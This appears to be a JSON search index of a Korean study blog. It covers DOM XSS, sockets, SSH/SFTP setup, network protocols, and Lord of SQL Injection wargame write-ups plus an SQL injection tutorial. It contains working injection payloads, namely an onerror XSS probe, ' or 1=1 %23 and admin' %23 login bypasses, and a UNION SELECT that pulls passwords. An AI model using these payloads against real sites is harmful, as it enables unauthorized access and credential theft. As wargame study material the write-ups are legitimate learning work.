HTTP 응답 값에는 공격자의 스크립트가 포함되어 있지 않다. 공격자의 스크립트는 DOM 객체 생성 시 클라이언트 측 스크립트에 포함된다. URL을 통해 공격한다. 2. DOM Based XSS 시나리오 먼저, 공격자는 피해자를 피싱하여 DOM Based XSS 공격 페이로드가 포함된 링크를 클릭하도록 한다. 피해자가 해당 링크를 클릭하면, DOM Based XSS 취약점이 있는 브라우저는 해당 페이로드가 포함된 웹 페이지 요청을 웹 사이트에 전송한다. 웹 서버에서 해당 페이지로 응답하면 브라우저는 페이지에 대한 DOM 객체를 생성한다. 브라우저에 의해 공격자의 악성 스크립트가 실행된다. 3. DOM Based XSS 절차 삽입한 글자들이 조립되는지 확인한다. HTML 특수문자를 필터링하는지 확인한다. POC Script 또는 Event Handler를 삽입한다. ex) &amp;lt;img src=x onerror=”alert(xss)”&amp;gt; URL 인코딩을 고려하여 띄어쓰기는 %20으로 표기해준다. " }, { "title": "소켓 (Socket)", "url": "/posts/Socket/", "categories": "Study, Computer", "tags": "", "date": "2021-11-06 00:00:00 +0900", "snippet": "소켓 (Socket) 통신들어가기 전 소켓은 통신을 위한 일종의 통로 역할을 한다. 통신을 원하는 프로세스 양측에 소켓을 생성해주어야한다. 연결 시 역할에 따라 Client 소켓과 Server 소켓으로 나뉜다. 1. Client 소켓과 Server 소켓 Client 소켓 : 연결 요청을 보내는 소켓 Server 소켓 : 연결 요청을 받아들이는 소켓 Client 소켓과 Server 소켓은 태생적으로는 동일하나, 소켓의 역할과 구현 절차 구분을 위해 다르게 부르는 것일 뿐이다. Server 소켓은 Client 소켓의 연결 요청을 받아들이는 역할만 수행할 뿐, 직접적인 데이터 송수신은 Server 소켓의 연결 요청 수락의 결과로 생성되는 새로운 소켓을 통해 처리된다. 2. 소켓 통신의 흐름Client 소켓 소켓을 생성(create)하고, 서버 측에 연결(connect)을 요청한다. Server 소켓에서 연결이 받아들여지면 데이터를 송수신(send/recv)하고, 데이터 송수신이 완료되면 소켓을 닫는다(close). Server 소켓 소켓을 생성(create)하고, 서버가 사용할 IP 주소와 Port 번호를 생성한 소켓에 결합(bind)시킨다. 그 다음, Client 소켓으로부터 연결 요청이 수신될 때까지 대기(listen)하고, 요청이 수신되면 요청을 받아들여(accept) 데이터 통신을 위한 새로운 소켓을 생성한다. 새로운 소켓을 통해 연결이 수립되면, 클라이언트와 마찬가지로 데이터를 송수신(send/recv)할 수 있다. Server 소켓은 또 다른 연결 요청을 처리하기 위해 다시 대기(listen)한다. 데이터 송수신이 완료되면 소켓을 닫는다(close). 이처럼, 실질적인 데이터 송수신은 Server 소켓이 아닌, 연결이 수립된 새로운 소켓을 통해 처리된다." }, { "title": "LOS - 2번 cobolt", "url": "/posts/los-2/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-10-31 00:00:00 +0900", "snippet": "[02] cobolt문제풀이저번 문제에서 이미 다뤘던 preg_match()가 반겨준다.필터링 부분에서 달라진 점은 없다.이번에도 역시 필터링 문제는 없을 것 같다.그 아래 쿼리문을 보겠다.$query = &quot;select id from prob_cobolt where id=&#39;{$_GET[id]}&#39; and pw=md5(&#39;{$_GET[pw]}&#39;)&quot;;$result = @mysqli_fetch_array(mysqli_query($db,$query));prob_cobolt에 저장된 사용자의 비밀번호는 해싱되어있다는 것을 유추할 수 있다.id 값과 pw 값의 해시값이 동시에 일치하는 레코드의 id를 뽑아오는 구조다.일단 아래로 넘어간다.if($result[&#39;id&#39;] == &#39;admin&#39;) solve(&quot;cobolt&quot;);elseif($result[&#39;id&#39;]) echo &quot;&amp;lt;h2&amp;gt;Hello {$result[&#39;id&#39;]}&amp;lt;br&amp;gt;You are not admin :(&amp;lt;/h2&amp;gt;&quot;;뽑아온 id 값이 admin인 경우에만 문제가 풀린다는 것을 알 수 있다.위에서 pw의 해시값을 쓰는 것을 보고 잠깐 멈칫했으나,어차피 #을 필터링하고 있지 않기 때문에 아이디 뒷부분을 주석 처리해주면 간단히 풀릴 것 같다.admin&#39; #를 입력하면 될 것 같은데,저번 문제에서 언급했다시피 #은 %23으로 대체해서 입력해준다.admin&#39; %23결과" }, { "title": "LOS - 1번 gremlin", "url": "/posts/los-1/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-10-29 00:00:00 +0900", "snippet": "[01] gremlin문제풀이첫 줄부터 내려오다보면 낯선 함수가 보인다.preg_match() 란?인자로 전달받은 정규 표현식과 일치하는 패턴을 검색하는 php의 함수이다.정규 표현식이란?문자열을 바탕으로 검색을 수행하여 패턴과 일치하는지 조사하고, 분할하는 문자열 처리 방법이다.말이 어렵지만 결국preg_match() 함수에 인자로 들어오는 정규식 표현을 토대로검색 대상 문자열을 싹 다 훑어서 해당 정규식 표현과 일치하는 패턴을 찾아낸다는 말이다.preg_match() 는 세가지 인자를 받는다. 정규식 표현 검색 대상 문자열 매칭된 값을 배열로 저장하고 싶을 시, 배열의 변수 따라서 다음과 같은 모양이다.preg_match(&#39;/정규식표현/&#39;, &#39;검색대상문자열&#39;, &#39;배열변수&#39;)preg_match($pattern, $subject, $matches)$pattern 부분에 정규식 표현을 작성하고,$subject 부분에 검색 대상 문자열을 알려주고,매칭된 값을 따로 배열에 저장하고 싶다면 $matches 를 적어주면 되는 것이다.이제 다시 문제로 돌아가보면 다음 코드가 의미하는 바를 알 수 있다.preg_match(&#39;/prob|_|\\.|\\(\\)/i&#39;, $_GET[id])GET으로 받은 id 값을 대상으로, /prob _ . ( ) 위 다섯가지 표현을 검색한다는 것이다. 참고로 preg_match() 함수는 검색 결과가 있을 시 1을, 없을 시 0을 반환한다.여기까지 오면 아래 코드도 이해가 된다.if(preg_match(&#39;/prob|_|\\.|\\(\\)/i&#39;, $_GET[id])) exit(&quot;No Hack ~_~&quot;);결국 이 한 줄이 의미하는 바는,GET으로 받은 id 값을 대상으로 다섯가지 표현을 검색한 후,매칭되는 패턴이 존재하면 exit 된다는 뜻이다. pw 값에도 같은 필터링 규칙이 적용된다.이제 그 아랫줄을 보겠다.$query = &quot;select id from prob_gremlin where id=&#39;{$_GET[id]}&#39; and pw=&#39;{$_GET[pw]}&#39;&quot;;$result = @mysqli_fetch_array(mysqli_query($db,$query));GET으로 전달받은 id와 pw가 동시에 일치하는 레코드의 id 값을 갖고 오겠다는 것이다.이해에 무리가 없으니 그 아랫줄로 넘어가겠다.if($result[&#39;id&#39;]) solve(&quot;gremlin&quot;);아까 fetch해준 $result에 id 값이 정상적으로 존재하면 문제가 풀린다는 것을 알 수 있다.지금까지의 분석을 통해,WHERE절 뒷부분을 True로 만들어 조건을 충족시켜주는 것으로 해결 가능한 예제임을 알 수 있다.쿼리문을 다시 한번 보겠다.&quot;select id from prob_gremlin where id=&#39;{$_GET[id]}&#39; and pw=&#39;{$_GET[pw]}&#39;&quot;GET으로 넘길 id 값에 ’ or 1 = 1 # 을 입력해주면 최종 쿼리문은 다음과 같이 완성된다.&quot;select id from prob_gremlin where id=&#39;&#39; or 1 = 1 # &#39; and pw=&#39;{$_GET[pw]}&#39;&quot;결과적으로 조건절이 참이 되며prob_gremlin의 모든 id를 요청하게 된다.그렇게 되면 $result[‘id’]에는 prob_gremlin 첫 행의 id 값이 담기게 되고, 문제는 풀리게 된다. mysqli_fetch_array 함수의 특성상 한번의 콜에 하나의 행만 가져올 수 있기 때문이다.자, 그럼 처음에 언급했듯, ’ or 1 = 1 # 을 url 뒤에 붙여준다.&#39; or 1 = 1 #엔터 쳐보면… 안 풀린다.url에 직접 값을 붙여줄때는url encoding을 거쳐줘야하기 때문이다.#은 인코딩했을 때 %23 이다.자주 쓰기 때문에 외워두면 좋고,구글링하면 나오는 url encoder를 사용해도 된다.그럼 다시 입력해보자.&#39; or 1 = 1 %23결과" }, { "title": "SFTP 연결 및 파일 전송 Command", "url": "/posts/SFTP-Protocol/", "categories": "Study, Computer", "tags": "", "date": "2021-10-21 00:00:00 +0900", "snippet": "SFTP 연결 및 파일 전송 Command들어가기 전 업로드할 파일이 있는 로컬 디렉토리에 위치한 상태에서 서버와 연결해준 후 파일 교환을 시작하면 된다. 업로드 시 특징 (vs SCP) 복잡하게 경로 적을 일이 현저히 줄어든다. 로컬에서 서버로 업로드 시, 전송된 파일은 서버의 홈 디렉토리 안에 저장된다. 현재 작업 디렉토리에 없는 파일을 업로드 시에는 파일명 자리에 절대 경로를 적어주면 된다. 다운로드 시 특징 (vs SCP) 서버 접속 시 디렉토리 탐색이 가능하기 때문에, 다운로드할 파일이 있는 서버 디렉토리로 들어가주면 된다. 탐색 커맨드는 Bash 커맨드와 거의 똑같다. SFTP 접속 연결$ sftp [Remote_Username]@[Remote_IP] 포트 변경 시$ sftp -P [포트번호] [Remote_Username]@[Remote_IP]Local → Remote 방향으로 업로드 파일 업로드$ put [파일명] 업로드한 파일을 다른 이름으로 저장$ put [파일명] [새로운파일명] 디렉토리 업로드$ put -r [디렉토리명] 실패하거나 중단된 경우 재개$ reput [파일명]Remote → Local 방향으로 다운로드 파일 다운로드$ get [파일명] 다운로드한 파일을 다른 이름으로 저장$ get [파일명] [새로운파일명] 디렉토리 다운로드$ get -r [디렉토리명] 실패하거나 중단된 경우 재개$ reget [파일명]접속 종료 아래 Command 중 아무거나$ bye$ quit$ exit" }, { "title": "SSH (Secure Shell)", "url": "/posts/SSH/", "categories": "Study, Computer", "tags": "", "date": "2021-10-20 00:00:00 +0900", "snippet": "SSH 기초1. SSH란?Secure Shell = 보안 셸원격지 호스트 컴퓨터에 접속하기 위해 사용하는 인터넷 프로토콜이다.과거에 주로 사용되던 Telnet은 암호화가 이루어지지 않아 보안 상 취약했으므로,기존의 기능에 암호화 기능을 추가하여 1995년에 나온 프로토콜이다.현재는 원격 접속 보안을 위한 필수적인 요소로 자리잡고 있다.Port 번호는 22번이다.2. SSH의 강점사용자 인증부터 데이터 전송까지 모든 과정이 암호화되기 때문에 보안성이 매우 높다. 만약 통신이 노출되더라도 이해할 수 없는 암호화된 문서로 보인다.3. SSH의 주요 기능 보안 접속을 통한 Rsh, Rcp, Rlogin, Rexec, Telnet, Ftp 등을 제공한다. IP Spoofing*을 방지하기 위한 기능을 제공한다. X11 패킷 포워딩 및 일반적인 TCP/IP 패킷 포워딩을 제공한다. IP Spoofing : IP 위/변조 기법 중 하나4. SSH 작동 원리의 핵심SSH의 핵심은 ‘Key’ 다.SSH는 키를 기반으로 통신한다고 해도 과언이 아니다.클라이언트와 서버는 각각의 키를 보유하고 있으며,이 키를 이용해 연결 상대를 인증하고 안전하게 데이터를 주고 받는다.키를 생성하는 방식에는 아래의 두 가지가 있다. 비대칭키 (= 공개키, 개인키) : 접속 시도 시 클라이언트와 서버가 서로를 알아보기 위해 사용 대칭키 : 접속이 허용된 상태에서 정보를 안전하게 주고 받기 위해 사용 4-1. 비대칭키란?클라이언트와 서버가 서로를 인증하기 위해 사용하는 서로 다른 두 개의 키를 말한다.SSH를 통해 서버로 접속을 시도하면, 먼저 이 비대칭키라는 것을 사용하여 인증 과정을 거쳐야한다.SSH에서 비대칭키란 공개키와 개인키를 뜻하며, 이 둘은 묶어서 Key Pair라고도 불린다.4-2. 대칭키란?비대칭키 인증 방식을 거쳐 접속이 허용되었다고 하더라도,클라이언트와 서버가 정보를 안전하게 교환하기 위해서는 추가적인 암호화 과정이 필요하다.이 경우, 비대칭키 방식과는 달리 한 개의 키만을 사용하며, 이 키를 대칭키라고 부른다.SSH 심화1. SSH는 왜 안전한가?SSH는 커넥션을 맺을 때 3가지 암호화 방식을 사용하여 보안성을 확보한다.이 과정이 상당히 정교하기 때문에, 제 3자가 통신 내용을 확인할 수 없으며 아무나 서버에 접속하지 못 한다.1-1. SSH 암호화SSH 암호화에는 총 3가지 방식이 사용된다. 비대칭키 암호화 대칭키 암호화 해시 2. SSH 접속 과정2-1. 서버 인증 및 세션 키 생성접속하려는 서버가 올바른 서버인지 검증하고, 이후의 데이터 통신을 안전하게 진행하기 위한 세션 키를 생성하는 과정이다. 접속 요청을 받은 서버는 클라이언트에게 자신의 공개키를 전송한다. 최초 접속이라면, 서버로부터 전달받은 공개키를 로컬에 저장할 건지 물어봐온다. 동의한다면 해당 공개키가 클라이언트 측 홈 디렉토리의 .ssh/known_hosts 파일 안에 추가된다. 이후부터는 해당 서버에 접속 요청을 할 때마다 서버로부터 전달받은 공개키가 로컬에 저장되어 있는 공개키와 같은 것인지 검증하게 되며, 같다면 올바른 서버로 판단하게 된다. 이 과정에서, 데이터 통신 시 암호화 및 복호화를 위해 사용될 대칭키 (= 세션키) 가 생성된다. 2-2. 클라이언트 인증클라이언트가 해당 서버에 대한 올바른 접근 권한을 가지고 있는지 검증하는 과정이다.클라이언트 인증에는 아래의 두 가지 방식이 있다. Password 인증 보안 상 취약하여 권장되지 않는 방식이다. SSH 공개키 인증 권장되는 인증 방식이다. 인증 절차는 아래와 같다. 2-3. SSH 공개키 인증클라이언트 측에서 Key Pair를 생성하고 서버에 공개키를 전송하는 작업은 이미 완료한 상태라고 가정한다. 클라이언트는 해당 서버에 접속하기 위해 사용할 Key Pair의 ID를 서버에 전송한다. 서버는 해당 ID에 매칭되는 공개키가 홈 디렉토리의 .ssh/authorized_keys 파일 안에 작성되어 있는지 찾는다. 존재한다면, 난수 값을 생성하고 이를 해당 공개키로 암호화하여 클라이언트에 전송한다. 클라이언트는 전달받은 암호화된 난수 값을 해당 개인키로 복호화한다. 이후 복호화한 난수 값을 이용하여 MD5 해시 값을 계산하고, 이를 다시 서버에 전송한다. 서버도 생성했던 난수 값을 이용하여 MD5 해시 값을 계산하고, 클라이언트로부터 받은 값과 같은지 검사한다. 같다면, 올바른 클라이언트임이 인증되어 본격적인 데이터 통신이 가능해진다. 3. SSH 데이터 통신 과정접속 시 생성한 대칭키 (= 세션키) 를 이용하여 서로 데이터를 주고 받으며 통신한다.보낼 때는 대칭키로 암호화하고, 받을 때는 대칭키로 복호화하는 방식이다.통신이 종료되면 (= SSH 세션이 종료되면) 해당 대칭키는 폐기되며,다시 접속할 때마다 새로운 대칭키가 생성되어 통신에 사용된다." }, { "title": "SSH 공개키 인증을 사용하여 로그인하는 방법", "url": "/posts/SSH-Login/", "categories": "Study, Computer", "tags": "", "date": "2021-10-20 00:00:00 +0900", "snippet": "SSH 공개키 인증을 사용하여 로그인하는 방법들어가기 전 클라이언트 측에는 OpenSSH 클라이언트가, 서버 측에는 OpenSSH 서버가 설치되어있어야 합니다. 간단한 과정이기 때문에 구글링해서 확인 후 설치해주세요. 전체 과정 요약 클라이언트 측에서 키를 두 개 생성한다. 생성한 키 중 하나를 서버에 복사해준다. 1. 클라이언트 측에서 키 생성 $ ssh-keygen ⇒ 비대칭 Key Pair를 생성한다. 경로, Passphrase 설정 ⇒ 둘 다 설정 안해도 무방 (Enter 두 번 입력) /.ssh 디렉토리로 들어가기 ⇒ 아래와 같이 키가 두 개 생성된 것을 볼 수 있다. (known_hosts는 무시) id_rsa : Private Key (= 개인키) id_rsa.pub : Public Key (= 공개키) 곧 다시 돌아올 디렉토리이기 때문에 끄지 않고 둔다. 2. 서버에 공개키 복사해주기 $ ssh [서버 사용자명]@[서버 IP주소] 서버 사용자의 Password 입력 ⇒ 서버 접속 성공 $ ls -a ⇒ 출력된 리스트 중에 .ssh가 있는 지 확인한다. 없을 시에는 $ mkdir .ssh 를 입력하여 생성해준다. 아까 열어둔 Windows 디렉토리를 띄우고, id_rsa.pub 파일을 메모장으로 연다. 메모장에 적힌 내용 (= 공개키) 을 통째로 복사한다. 터미널로 돌아온다. $ echo [공개키 전문] » ~/.ssh/authorized_keys $ exit ⇒ 서버에서 빠져나온다. 3. 재접속 $ ssh [서버 사용자명]@[서버 IP주소] 더 이상 Password를 물어보지 않고 아래와 같이 바로 접속이 된다. 이외-1. 자동 로그인이 안되고 여전히 Password를 물어본다면?다음은 구글링 키워드다. ssh 공개키 로그인 안됨 sshd_config ssh 공개키 로그인 안됨 권한 이외-2. 접속할 때마다 명령어를 입력하는 것이 귀찮다면?서버에 들어갈 때마다 매번 IP를 찾아서 붙여넣기가 귀찮다면$ ssh [서버 사용자명]@[서버 IP주소]위 커맨드를 일종의 실행 파일로 만들어주면 된다. $ cd [원하는 디렉토리] $ vim [실행파일명].bat ⇒ 실행파일의 확장자를 반드시 .bat 으로 해준다. 아래와 같이 적는다. @echo offtitle Choco-Ubuntu-SSH #원하는 제목ssh &#39;서버 사용자명&#39;@&#39;서버 IP주소&#39; #-p &#39;포트번호&#39; : 22번이 아닌 포트를 사용하고 싶을 시 주석 풀고 지정:pause 저장한 후 빠져나온다. 생성된 실행 파일 클릭 시, 원하는 서버로의 SSH 접속이 완료된 상태의 셸이 열린다. " }, { "title": "VSCode에서 SFTP Extension 사용하기", "url": "/posts/SFTP-Extension-copy/", "categories": "Tools, VSCode", "tags": "", "date": "2021-10-18 00:00:00 +0900", "snippet": "VSCode SFTP Extension1. SFTP란?보안성이 강화된 파일 전송 프로토콜이다.이름도 기능도 FTP와 유사하나, SSH을 기반으로 만들어진 확장 프로토콜이다.따라서 Port 번호는 22번을 이용한다.2. VSCode에서 SFTP Extension의 역할가상 환경에 올린 리눅스로 개발을 하다보면 명확히 불편한 점이 있다.Host PC와 Guest PC 간의 소스 코드 공유가 녹록치 않다는 점이다.물론 Git을 이용할 수도 있지만, 일일이 Push &amp;amp; Pull로 작업 상황을 맞춰주는게 생각보다 귀찮다.그냥 한쪽에서 수정을 하면, 반대쪽의 파일도 바로 수정한 내용으로 업데이트되게끔 할 순 없을까?바로 이런 경우에 SFTP 확장을 사용하면 된다.VSCode에서 SFTP Extension을 사용하는 방법0. 들어가기 전이 포스팅은 서버에서 작성한 파일을 로컬로 받아오는 방향으로 작성되었습니다.서버에 SSH 설치가 되어있지 않으면 연결이 불가능하므로 아래 절차를 따라주세요. SSH 설치 여부 확인$ sudo dpkg -l | grep ssh 설치가 되어있지 않을 시 아래 과정을 따라주세요$ sudo apt update$ sudo apt install openssh-server$ sudo systemctl status ssh (SSH가 active 상태인지 확인*)$ sudo ufw status (방화벽이 inactive 상태인지 확인*) SSH는 active, 방화벽은 inactive 상태라면 1. SFTP Extension 설치 로 넘어가주세요. 만약 SSH가 inactive 상태라면 $ sudo systemctl enable ssh$ sudo systemctl start ssh 만약 방화벽이 active 상태라면$ sudo ufw allow ssh1. SFTP Extension 설치 VSCode 좌측 작업바를 보면 타일 모양으로 된 메뉴가 있다. (Extension Menu) 클릭해서 들어간 후, sftp라고 검색한다. 화면 상에 보이는 Extension을 설치해준다. 2. 연결할 로컬 폴더 만들기 서버에 연결될 로컬 공간을 만들어줘야 한다. 적당히 폴더를 하나 생성한 후 VSCode 상에서 열어준다. 3. 환경 설정하기 F1을 누르고 검색창에 sftp라고 입력한다. SFTP: Config를 클릭한다. 아래와 같은 파일이 열린다. (sftp.json) 원하는대로 설정을 변경해준다. name : 연결에 대해 설명 host : 연결할 대상 (서버) 의 IP 주소 protocol : sftp port : 22 username : 연결할 대상 (서버) 사용자의 이름 password : 연결할 대상 (서버) 사용자의 비밀번호 remotePath : 로컬과 연결할 서버의 파일 경로 uploadOnSave : True일 경우, 로컬에서 변경 사항을 저장할 때마다 서버 파일에 동기화됨 이 외 다른 옵션들도 있으니 필요하면 찾아보고 추가해준다. 4. 서버와 연결 F1을 누르고 검색창에 sftp라고 입력한다. SFTP: List All을 클릭한다. 방금 설정했던 name과 IP 주소가 보인다. 클릭한다. 불러오고 싶은 파일을 선택한다.(디렉토리 내의 모든 파일을 불러오고 싶다면 맨 위의 [. choose current folder] 를 클릭한다.) 모든 파일이 로컬 폴더 안에 동기화되는 것을 볼 수 있다.5. No Such File 오류로컬에서 파일 변경 후 저장 시 VSCode 우측 하단에 [No Such File] 오류가 뜬다면 아래의 과정을 따라주세요. 아래 경로의 파일을 열어주세요.C:/Users/&quot;계정명&quot;/.vscode/extensions/liximomo.sftp-1.12.9/node_modules/ssh2-streams/lib/sftp.js 338번 라인의 내용을 아래와 같이 변경해주세요.if (code === STATUS_CODE.OK) {// 이 부분을if (code === STATUS_CODE.OK || code === STATUS_CODE.NO_SUCH_FILE) {// 이렇게 변경하고 저장 후 다시 로드해주세요 저장 후 다시 로드하면 오류가 사라집니다.6. 이외 환경 설정 시 sftp.json 에서 uploadOnSave를 On으로 설정했다면 로컬에서 저장할 때마다 서버에 내용이 동기화된다. 반대로 서버에서 변경한 사항을 로컬로 동기화하고 싶을 때는 위에서와 똑같이 [F1 누르고 - SFTP: List All 클릭 - 클릭 - 클릭..] 해주면 된다. 로컬이나 서버 한쪽에서 Git을 함께 활용하면 버전 관리까지 가능해 강력한 편의성을 얻을 수 있다. " }, { "title": "프로토콜 (Protocol)", "url": "/posts/Protocol/", "categories": "Study, Computer", "tags": "", "date": "2021-10-18 00:00:00 +0900", "snippet": "프로토콜 (Protocol)1. 프로토콜이란? 컴퓨터나 원거리 통신 장비 사이에서 메시지를 주고 받는 양식과 규칙의 체계 어떤 액션/이벤트/서비스 상황을 수행하기 위해 여러 과정 원칙을 정의한 것 1-1. 프로토콜의 필요성네트워크에는 다양한 규격의 디바이스가 존재하며, 개체 간 주고 받는 데이터 또한 다양하다.이렇게 서로 다른 환경의 컴퓨터끼리 통신하려면 어떻게 작업해야 할까? 각 케이스 별로 데이터를 전달/연결할 방식을 미리 정의해두고 이를 따르도록 강제하면 된다.즉, 프로토콜을 따른다는 것의 의미는 = 컴퓨터가 미리 선언된 원칙대로 작동하게 한다는 것이다.1-2. 프로토콜 이해걷기 위해서는 걷기 위한 프로토콜을,뛰기 위해서는 뛰기 위한 프로토콜을,헤엄치기 위해서는 헤엄치기 위한 프로토콜을 사용해야한다.2. 프로토콜의 종류 HTTP : 하이퍼텍스트 문서를 교환하기 위한 프로토콜 HTTPS : HTTP + Secure 라는 뜻으로, SSL을 기반으로 돌아가기 때문에 기존의 HTTP 보다 보안성이 높음. FTP : 파일 전송을 위한 프로토콜 TFTP : FTP와 마찬가지로 파일을 전송하기 위한 프로토콜. FTP보다 더 단순한 방식. 구현이 간단하긴 하지만 전송 과정에서 데이터 손실 가능성이 있는 등 다소 불안정함. Telnet : 원격지 컴퓨터에 접속해주는 프로토콜. 보안성이 낮아 요즘에는 거의 쓰이지 않음. SMTP : 메일 송신 프로토콜 POP : 메일 수신 프로토콜 SNMP : 네트워크 장비 요소 간 네트워크 관리 및 전송을 위한 프로토콜 DHCP : IP 주소를 자동으로 할당하고 관리하는 프로토콜 TCP : 데이터 흐름을 제어하고 에러 유무를 검사하는 프로토콜 UDP : Datagram을 전송하기 위한 프로토콜 IP : 패킷의 주소를 해석하고 경로를 결정한 후 전송하는 프로토콜 ARP : IP 주소를 이용해 상대방의 MAC 주소를 알아오는 프로토콜 RARP : MAC 주소에 해당하는 IP 주소를 알아오는 프로토콜 ICMP : 통신 중 발생하는 오류 처리와 정보 경로 변경 등을 위한 제어 메세지를 관리하는 프로토콜 PPP : 모뎀과 전화선을 이용하여 인터넷에 접속할 때 사용하는 프로토콜 VoIP : 인터넷 전화 또는 음성패킷망이라고 부르며, 초고속인터넷과 같이 IP망을 기반으로 패킷 데이터를 통해 음성 통화를 구현하는 통신 기술 이외에도 수많은 프로토콜들이 존재한다." }, { "title": "TCP/IP 4계층", "url": "/posts/TCP-IP/", "categories": "Study, Computer", "tags": "", "date": "2021-10-17 00:00:00 +0900", "snippet": "OSI 7계층과 TCP/IP 4계층0. OSI 7계층과 TCP/IP 4계층복잡한 네트워크를 단계별로 나누어 이해하기 쉽도록 도와주는 일종의 표준 규약이다.네트워크의 연결은 각기 다른 역할을 담당하는 기능 및 장비들에 의해 어떠한 절차와 복잡한 규약을 바탕으로 한 논리 구조 위에서 이루어진다.이 기능과 절차를 1983년도에 표준화하여 정리한 것이 OSI 7계층이다.한편, 현대 네크워크는 대부분 IP를 기반으로 한 TCP 통신으로 이루어져 있다.이에 TCP/IP 통신 방식이 통신 표준으로 채택되면서, 인터넷 프로토콜 스위트라고도 불리는 TCP/IP 4계층이 만들어졌다.계층을 나누는 이유 복잡한 작업을 여러개의 작고 단순한 작업들로 나눌 수 있게 해준다. 계층화의 가장 큰 특징은 모듈성이다. 즉, 각각의 계층을 여러개의 모듈처럼 취급할 수 있다. 모듈성은 서비스 구현의 분리, 전문화, 중간 시스템의 통신 가능이라는 이점을 가져다 준다. 때문에 하나의 계층이 고장나더라도 시스템 전체를 바꾸지 않아도 되며, 어느 계층이 고장났는지 파악하기가 쉽다. 1. OSI 7계층 과거에는 통신용 규약이 표준화되지 않았기 때문에 호환되지 않는 시스템이나 애플리케이션이 많았고, 통신이 불가능한 경우가 잦았다. 이를 하나의 규약으로 통합하려는 노력이 현재의 OSI 7계층으로 남아있다. 네트워크 동작을 나누어 이해하고 개발하는 데 많은 도움이 되므로 네트워크의 주요 레퍼런스 모델로 활용되고 있지만, 현재는 대부분의 프로토콜이 TCP/IP 프로토콜 스택 기반으로 되어있다. 2. TCP/IP 4계층TCP/IP 4계층 = 인터넷 프로토콜 스위트 (Internet Protocol Suite) = 인터넷 프로토콜 모음 데이터가 의도된 목적지에 닿을 수 있도록 보장해주는 통신 규약으로, 가장 일상적으로 사용되는 프로토콜 모음이다. 컴퓨터가 데이터 패킷을 컴파일하고 올바른 위치로 전송하여 인터넷을 통해 다른 컴퓨터와 통신 할 수 있게 한다. TCP/IP 5계층이라고 하는 경우도 있는데, 기존의 TCP/IP 4계층에 OSI 7계층을 조금 반영하여 Network Interface 계층을 Datalink 계층과 Physical 계층으로 다시 나눈 것을 말한다. 공식적으로는 4계층이다. 3. OSI 7계층 vs TCP/IP 4계층 두 모델 모두 계층형 구조를 갖고 있다. TCP/IP 4계층이 OSI 7계층 보다 먼저 개발되었다. 따라서 둘은 정확하게 일치하지는 않는다. 두 계층을 비교해보면, OSI 7계층에는 존재하는 세션과 프레젠테이션 2개의 계층이 TCP/IP 4계층에는 없다. TCP/IP 4계층은 인터넷 개발 이후 계속 표준화되어 신뢰성이 우수하나, OSI 7계층은 실제적으로 구현되는 예가 거의 없어 신뢰성이 다소 저하되었다. OSI 7계층은 이론적인 모델에 가까우며, 실질적인 통신에서는 대부분 TCP/IP 4계층을 이용한다. TCP/IP 4계층1층. 네트워크 인터페이스 계층 (Network Interface Layer)네트워크 드라이버와 같은 물리적인 TCP/IP 패킷의 전달 및 수신 과정을 담당한다.MAC Address로 호스트의 NIC (LAN 카드) 를 판별한다. Protocol Example Ethernet Token Ring PPP 2층. 인터넷 계층 (Internet Layer)IP 주소를 판독한 후 라우팅을 통하여 패킷을 호스트로 전달하는 역할을 담당한다.IP Address로 호스트를 판별한다. Protocol Example IP ARP RARP ICMP IGMP OSPF 3층. 전송 계층 (Transport Layer)신뢰성 있는 데이터 전송을 위해 전달되는 패킷의 오류를 검사하고 재전송을 요구하는 등 전반적인 제어를 담당한다.Port 번호로 프로세스를 판별한다. Protocol Example TCP UDP 4층. 응용 계층 (Application Layer)사용자의 응용 프로그램 레벨에서 데이터를 처리하는 계층으로, 사용자와 가장 가까운 계층이다.서버나 클라이언트 응용 프로그램이 이 계층에서 동작한다.동작을 위해 전송 계층의 주소, 즉 Port 번호를 사용한다. Protocol Example HTTP (80) FTP (Data : 20, 제어 : 21) Telnet (23) DNS (53) SMTP (25) SSH (22) " }, { "title": "SQL Injection", "url": "/posts/SQL-Injection/", "categories": "Study, Webhacking", "tags": "", "date": "2021-10-17 00:00:00 +0900", "snippet": "SQL Injection : 개념 및 공격 기법1. SQL Injection 개념보안상의 취약점을 이용하여, 임의의 SQL문을 주입하고 실행되게 하여 DB가 비정상적인 동작을 하도록 조작하는 행위 OWASP TOP 10 중 첫 번째에 속해 있으며, 공격이 비교적 쉬운 편이고 공격에 성공할 경우 큰 피해를 입힐 수 있음 인증 우회, 시스템 명령어 삽입, 웹쉘 생성 등 2. SQL Injection 공격 기법 Error based SQL Injection UNION based SQL Injection Blind SQL Injection (1) Blind SQL Injection (2) Stored Procedure SQL Injection Mass SQL Injection 2-1. Error based SQL Injection[1] 논리적 에러를 이용함[2] 에러가 발생되는 사이트에서는 에러 정보들을 이용하여 DB 및 쿼리 구조 등의 정보를 추측 가능EXAMPLE (로그인)① 공격 대상 : SELECT * FROM Users WHERE id = ‘INPUT1’ AND password = ‘INPUT2’② 공격 예시 : SELECT * FROM Users WHERE id = ‘’ OR 1=1 – ‘ AND password = ‘INPUT2’③ 과정 : 싱글쿼터를 닫아주기 위한 싱글쿼터와, OR 1=1 구문을 이용해 WHERE 절을 모두 참으로 만들고, – 를 넣어줌으로써 뒤의 구문을 모두 주석 처리 해버림④ 결과 : Users 테이블에 있는 모든 정보를 조회하게 됨으로써 가장 먼저 만들어진 계정 (보통 관리자 계정) 으로 로그인할 수 있게 됨 → 관리자 계정 탈취2-2. UNION based SQL Injection[1] UNION : 두 개의 쿼리문에 대한 결과를 통합해 하나의 테이블로 보여주게 하는 키워드[2] 정상적인 쿼리문에 하나의 추가 쿼리를 삽입하여 원하는 정보를 획득함[3] UNION Injection이 성공하기 위해서는 두 가지의 조건이 있음⑴ 조건 1 : UNION하는 두 테이블의 컬럼 수가 같아야 함⑵ 조건 2 : UNION하는 두 테이블의 데이터 형이 같아야 함EXAMPLE (게시글 조회)① 공격 대상 : SELECT * FROM Board WHERE title LIKE ‘%INPUT%’ OR contents ‘%INPUT%’② 공격 예시 : SELECT * FROM Board WHERE title LIKE ‘% ‘ UNION SELECT null,id,passwd FROM Users – INPUT%’ OR contents ‘%INPUT%’③ 해설 : 위의 쿼리문은 Board라는 테이블에서 게시글을 검색하는 쿼리문이다. 입력값을 tiltle 과 contents 컬럼의 데이터와 비교한 뒤 비슷한 글자가 있는 게시글을 출력한다. 여기서 입력값으로 UNION 키워드와 함께 컬럼 수를 맞춰서 SELECT 구문을 넣어주게 되면 두 